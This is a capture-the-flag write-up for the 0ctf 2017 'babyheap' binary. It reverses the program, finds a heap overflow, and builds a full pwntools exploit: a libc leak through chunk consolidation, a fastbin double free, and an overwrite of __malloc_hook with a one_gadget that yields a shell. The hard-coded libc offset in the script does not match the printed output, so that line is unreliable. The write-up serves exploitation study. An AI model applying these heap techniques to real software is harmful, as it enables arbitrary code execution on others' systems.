# 0ctf 2017 Babyheap

So we are given a libc file and an elf. When we run the elf, we see that we are given five options. Let's reverse this elf:

## Reversing

#### Main

```
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  unsigned __int64 menu_options; // rax@2

  sub_B70();
  do
  {
    print_menu();
    menu_options = request_int();
  }
  while ( menu_options > 5 );
  JUMPOUT(__CS__, (char *)dword_14F4 + dword_14F4[menu_options]);
}
```

So here we can see the main function. It essentially just prompts the user for an integer, and then jumps to the corresponding function.

#### Alloc

```
void __fastcall allocate_option(__int64 a1)
{
  signed int i; // [sp+10h] [bp-10h]@1
  signed int size; // [sp+14h] [bp-Ch]@3
  void *ptr; // [sp+18h] [bp-8h]@6

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      size = request_int();
      if ( size > 0 )
      {
        if ( size > 0x1000 )
          size = 0x1000;
        ptr = calloc(size, 1uLL);
        if ( !ptr )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = size;
        *(_QWORD *)(a1 + 24LL * i + 16) = ptr;
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```

Here we can see a couple of things. The maximum size it will allow is `0x1000`.  In addition to that we can specify the size that we want to allocate with `calloc`.

#### Fill

```
unsigned __int64 __fastcall fill_option(__int64 a1)
{
  unsigned __int64 index; // rax@1
  int index_transfer; // [sp+18h] [bp-8h]@1
  int ptr; // [sp+1Ch] [bp-4h]@4

  printf("Index: ");
  index = request_int();
  index_transfer = index;
  if ( (index & 0x80000000) == 0LL && (signed int)index <= 15 )
  {
    index = *(_DWORD *)(24LL * (signed int)index + a1);
    if ( (_DWORD)index == 1 )
    {
      printf("Size: ");
      index = request_int();
      ptr = index;
      if ( (signed int)index > 0 )
      {
        printf("Content: ");
        index = request_string(*(_QWORD *)(24LL * index_transfer + a1 + 16), ptr);
      }
    }
  }
  return index;
}
```

So we can see here that for filling a chunk, we just need to specify the chunk index, size, and the content. However we can also see that it doesn't check if the size of the content you are inputting will overflow the chunk. So we have a heap overflow here. The bug is right here:
```
        index = request_string(*(_QWORD *)(24LL * index_transfer + a1 + 16), ptr);
```

#### Free

```
__int64 __fastcall delete_option(__int64 a1)
{
  __int64 index; // rax@1
  int index_transfer; // [sp+1Ch] [bp-4h]@1

  printf("Index: ");
  index = request_int();
  index_transfer = index;
  if ( (signed int)index >= 0 && (signed int)index <= 15 )
  {
    index = *(_DWORD *)(24LL * (signed int)index + a1);
    if ( (_DWORD)index == 1 )
    {
      *(_DWORD *)(24LL * index_transfer + a1) = 0;
      *(_QWORD *)(24LL * index_transfer + a1 + 8) = 0LL;
      free(*(void **)(24LL * index_transfer + a1 + 16));
      index = 24LL * index_transfer + a1;
      *(_QWORD *)(index + 16) = 0LL;
    }
  }
  return index;
}
```

Here we can see that it does free the index that we would input. We can see that it clears the ptr to the chunk of allocated memory from the list of allocated chunks when it frees so we don't have a stale pointer bug. In addition to that, we can see that it also does check to see if the pointer you passed it is from the list of pointers.
#### Dump
```
signed int __fastcall dump_option(__int64 a1)
{
  signed int index; // eax@1
  signed int index_transfer; // [sp+1Ch] [bp-4h]@1

  printf("Index: ");
  index = request_int();
  index_transfer = index;
  if ( index >= 0 && index <= 15 )
  {
    index = *(_DWORD *)(24LL * index + a1);
    if ( index == 1 )
    {
      puts("Content: ");
      sub_130F(*(_QWORD *)(24LL * index_transfer + a1 + 16), *(_QWORD *)(24LL * index_transfer + a1 + 8));
      index = puts(byte_14F1);
    }
  }
  return index;
}
```

So here we can see is the option to dump. It checks to see if the index you gave it is valid (by that I mean it is in the list of allocated chunks), and if so it will print it's contents using `puts`. No bug here, but we will be able to use this for an infoleak.

## Pwn Process

So for this exploit, there will be two parts. The first is a libc infoleak, followed by writing over a malloc hook. The libc infoleak will allow us to break ASLR in libc and know the address of everything, and writing over the malloc hook with a ROP gadget (that will call system) will give us a shell when we call malloc (we need the infoleak to figure out where the malloc hook and rop gadget are):
 
#### Infoleak

For the infoleak, we will be using a heap consolidation technique. Below you can see exactly how we allocate/free/manage space:

First we allocate four chunks:
```
0xf0:	0
0x70:	1
0xf0:	2
0x30:	3
```

Proceeding that we will free chunks 0 and 1. This will add those chunks to the free list, and if we allocate a chunk of a similar size we will get that chunk again:
```
0xf0:	(freed)
0x70:	(freed)
0xf0:	2
0x30:	3
```

Now that they have been added to the free list, we can allocate another chunk that is `0x78` bytes large. Due to it's size (and the fact that we just freed a chunk of similar size) it will take the place of the old chunk 1:

```
0xf0:	(freed)
0x78:	0
0xf0:	2
0x30:	3
```

With that we can overflow chunk 2's metadata by using the bug we found with filling chunk 0. We will overflow the previous chunk size to be `0x180`, and the previous chunk in use bit to be `0x0`. That way when we free chunk `2`, it will think that the previous chunk isn't in use, and that the previous chunk's size is `0x180`. As a result it will move the heap back to where the first chunk 0 was, so when we allocate new heap space it will start where the first chunk 0 was:

```
0xf0:	(freed)
0x78:	0 Filled with data to overflow 2
0xf0:	2 (previous chunk overflowed to 0x180, previous in use bit overflowed to 0x0)
0x30:	3
```

Now that chunk 2's metadata has been overflowed, we can go ahead and free it. This will move the heap back to where the first chunk 0 was. By doing this, it will effictively forget about the new chunk 0, and will allow us to push a libc address into it's data section (the section after the heap metadata) so we can just print the chunk and leak the libc address:

```
0xf0:	(freed)
0x78:	0 
0xf0:	(freed)
0x30:	3
```

Proceeding that we can just allocate a new chunk that is `0xf0` bytes large (same size as original chunk 0), and it will push the libc address for `main_arena+88` into the data section of chunk 0:

```
0xf0:	1
0x78:	0 main_arena+88 in content section
0xf0:	(freed)
0x30:	3
```

Proceeding that we can just print the contents of chunk 0, and we will leak the libc address for `main_arena+88` (main arena contains heap memory that can be allocated without directly calling `mmap`).

#### Write over Malloc Hook

Now that we have the libc leak, we can execute the write over the malloc hook. In order to do this, we will need to create a fake chunk in libc (where the malloc hook is), and get calloc to return it. This way we can write to the malloc hook by writing to the fake chunk.

In order to do this, we will need to allocate the same chunk twice, which we can do if the chunk has multiple entries in the free list. This can be done if we execute a double free. Luckily for us, the infoleak leaves us in a good situation for this. This is because chunk 0 is essentially forgotten about, so if we format it write we will be able to allocate a chunk where chunk 0 currently is, that way we would have two pointers to the same chunk. Using those two pointers, we can free the same chunk twice and add the entry to the free list twice.

So this will start off from where the infoleak ended. We will continue by freeing chunk 1, so we can reformat our heap space to allocate another pointer to where chunk 0 is:
```
0xf0:	(freed)
0x78:	0
0xf0:	(freed)
0x30:	3
```

Proceeding that we can allocate four new chunks. The first chunk will be `0x10` bytes large, and the other three will be `0x60` bytes large. With that, due to the heap metadata the third chunk will directly overlap with the old chunk 0. As a result we would have the two pointers to the same chunk that we need:

```
0x10:	1
0x60:	2
0x60:	4
0xf0 & 0x60:	0 & 5 (these two chunks begin at exactly the same spoit, and have the same ptr)
0x30:	3
```

Proceeding this we can free the chunks `5`, `4`, and `0`. We need to free another chunk in between `5` and `4`, the reason for this being that when we free one of those chunks, it gets placed at the top of the free list. In addition to that if we free a chunk that is at the top of the free list, the program crashes. So if we free a chunk inbetween, when the same chunk get's freed again it won't be while it is also at the top of the free chunk (thus the program won't crash):

```
0x10:	1
0x60:	2
0x60:	(freed)
0xf0 & 0x60:	(freed) (these two chunks begin at exactly the same spoit, and have the same ptr)
0x30:	3
```

Now our free list starts with chunks `5`, `4`, and `0`. Proceeding that we can allocate another two chunks of the same size as `5`, `4`, and `0`. This will allow us to edit the memory that the old  `0` & `5` chunks point to:

```
0x10:	1
0x60:	2
0x60:	4
0xf0 & 0x60:	(freed & 0) (these two chunks begin at exactly the same spoit, and have the same ptr)
0x30:	3
``` 

Now that we have a chunk that is allocated and on top of the free list, we can get ready to add the fake chunk to the free list. To do this we will edit chunk 0, and write the address a little bit before the malloc_hook to it. The reason for this being is that when we allocate this new chunk that starts with this address, it will add that address to the free list (the reason why integer that we picked the one that is in the exploit is because it points to an integer that malloc will think is a free size, so the program doesn't crash):

```
0x10:	1
0x60:	2
0x60:	4
0xf0 & 0x60:	(freed & 0) (these two chunks begin at exactly the same spoit, and have the same ptr) content = fake chunk address
0x30:	3
```
 
 Now we can just allocate chunk 5 again, and due to the previous steps the address of our fake chunk will get added to the free list:
 
```
0x10:	1
0x60:	2
0x60:	4
0xf0 & 0x60:	(5 & 0) (these two chunks begin at exactly the same spoit, and have the same ptr) content = fake chunk address
0x30:	3
``` 

Now that the fake chunk has been added (and is at the top) of the free list, we can just allocate the fake chunk:

```
0x10:	1
0x60:	2
0x60:	4
0xf0 & 0x60:	(5 & 0) (these two chunks begin at exactly the same spoit, and have the same ptr) content = fake chunk address
0x30:	3
0x60:	6	fake chunk for malloc_hook
```

Now that we have a fake chunk, we can write over the malloc_hook. The value we will write over the malloc hook will be a ROP Gadget that due to our setup, we can just call that one address and get a shell. For this we will be using the tool One_Gadget from https://github.com/david942j/one_gadget to One Shot the program. To use this tool, you just need to point it at the libc file you are using (we will be using the gadget at `0x4526a`):

```
one_gadget libc-2.23.so 
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0274	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1117	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

## Exploit

Since I previously just discussed at high level how the exploit worked, here is the exploit source code itself:

```
# Import pwntools
from pwn import *

# First establish the target process and libc file
target = process('./0ctfbabyheap', env={"LD_PRELOAD":"./libc-2.23.so"})
gdb.attach(target)
elf = ELF('libc-2.23.so')

# Establish the functions to interact with the program
def alloc(size):
	target.recvuntil("Command: ")
	target.sendline("1")
	target.recvuntil("Size: ")
	target.sendline(str(size))

def fill(index, size, content):
	target.recvuntil("Command: ")
	target.sendline("2")
	target.recvuntil("Index: ")
	target.sendline(str(index))
	target.recvuntil("Size: ")
	target.sendline(str(size))
	target.recvuntil("Content: ")
	target.send(content)

def free(index):
	target.recvuntil("Command: ")
	target.sendline("3")
	target.recvuntil("Index: ")
	target.sendline(str(index))

def dump(index):
	target.recvuntil("Command")
	target.sendline("4")
	target.recvuntil("Index: ")
	target.sendline(str(index))
	target.recvuntil("Content: \n")
	content = target.recvline()
	return content

# Make the initial four allocations, and fill them with data
alloc(0xf0)# Chunk 0
alloc(0x70)# Chunk 1
alloc(0xf0)# Chunk 2
alloc(0x30)# Chunk 3
fill(0, 0xf0, "0"*0xf0)
fill(1, 0x70, "1"*0x70)
fill(2, 0xf0, "2"*0xf0)
fill(3, 0x30, "3"*0x30)

# Free the first two
free(0)# Chunk 0
free(1)# Chunk 1

# Allocate new space where chunk 1 used to be, and overflow chunk chunk 2's previous size with 0x180 and the previous in use bit with 0x0 by pushing 0x100
alloc(0x78)# Chunk 0
fill(0, 128, '4'*0x70 + p64(0x180) + p64(0x100))

# Free the second chunk, which will bring the edge of the heap before the new chunk 0, thus effictively forgetting about Chunk 0
free(2)

# Allocate a new chunk that will move the libc address for main_arena+88 into the content 
alloc(0xf0)# Chunk 1
fill(1, 0xf0, '5'*0xf0)

# Print the contents of chunk 0, and filter out the main_arena+88 infoleak, and calculate the offsets for everything else
leak = u64(dump(0)[0:8])
#libc = leak - elf.symbols['__malloc_hook'] - 0x68
libc = leak - 0x216c549f28
system = libc + 0x4526a
malloc_hook = libc + elf.symbols['__malloc_hook']
free_hook = libc + elf.symbols['__free_hook']
fake_chunk = malloc_hook - 0x23
log.info("Leak is:        " + hex(leak))
log.info("System is:      " + hex(system))
log.info("Free hook is:   " + hex(free_hook))
log.info("Malloc hook is: " + hex(malloc_hook))
log.info("Fake chunk is:  " + hex(fake_chunk))
log.info("libc is:        " + hex(libc))

# Free the first chunk to make room for the double free/fastbin duplicaion
free(1)

# Allocate the next four chunks, chunk 5 will directly overlap with chunk 0 and both chunks will have the same pointer
alloc(0x10)# Chunk 1
alloc(0x60)# Chunk 2
alloc(0x60)# Chunk 4
alloc(0x60)# Chunk 5

# Commence the double free by freeing 5 then 0, and 4 in between to stop a crash
free(5)
free(4)
free(0)

# Allocate 2 chunks, fill in the chunk that was freed twice with the fake chunk, allocate that chunk again to add the fake chunk to the free list
alloc(0x60)# Chunk 4
alloc(0x60)# Chunk 5
fill(0, 0x60, p64(fake_chunk) + p64(0) + 'y'*0x50)
alloc(0x60)# Chunk 0

# Allocate the fake chunk, and write over the malloc hook with the One Shot Gadget
alloc(0x60)# Chunk 6
fill(6, 0x1b, 'z'*0x13 + p64(system))

# Trigger a Malloc call to trigger the malloc hook, and pop a shell
target.sendline('1\n1\n')
target.recvuntil("Size: ")

# Drop to an interactive shell to use the shell
target.interactive()
```

When we run the exploit:
```
$	python exploit.py 
[+] Starting local process './0ctfbabyheap': pid 19522
[*] running in new terminal: /usr/bin/gdb -q  "/Hackery/0ctf/babyheap/0ctfbabyheap" 19522
[+] Waiting for debugger: Done
[*] '/Hackery/0ctf/babyheap/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Leak is:        0x7fdcce6c5b78
[*] System is:      0x7fdcce34626a
[*] Free hook is:   0x7fdcce6c77a8
[*] Malloc hook is: 0x7fdcce6c5b10
[*] Fake chunk is:  0x7fdcce6c5aed
[*] libc is:        0x7fdcce301000
[*] Switching to interactive mode
$ w
 23:18:50 up  3:22,  1 user,  load average: 1.46, 1.05, 0.87
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               20:06    3:21m  5:20   0.05s /bin/sh /usr/lib/gnome-session/run-systemd-session ubuntu-session.target
$ ls
0ctfbabyheap  core        overflow_bug           readme.md
1          exploit.py    peda-session-0ctfbabyheap.txt
2          libc-2.23.so  peda-session-dash.txt
3          notes        peda-session-w.procps.txt
$  
```

Just like that, we popped a shell!
